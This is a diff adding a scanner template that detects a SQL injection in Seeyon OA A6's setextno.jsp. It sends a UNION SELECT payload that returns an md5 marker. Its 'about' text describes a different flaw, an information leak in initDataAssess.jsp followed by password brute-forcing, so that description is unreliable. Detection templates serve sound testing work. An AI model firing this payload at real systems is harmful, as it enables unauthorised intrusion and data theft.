@@ -1,0 +1,26 @@
+id: seeyon-oa-setextno-sqli
+brief:
+    title: Seeyon OA A6 setextno.jsp - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: Seeyon OA A6 initDataAssess.jsp has leaked user sensitive information,You can blast the user password through the obtained username to enter the background for further attacks
+    label:
+        - seeyon
+        - oa
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5({{num}})),4#'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      signs:
+        - "on": word
+          has:
+            - '{{md5({{num}})}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
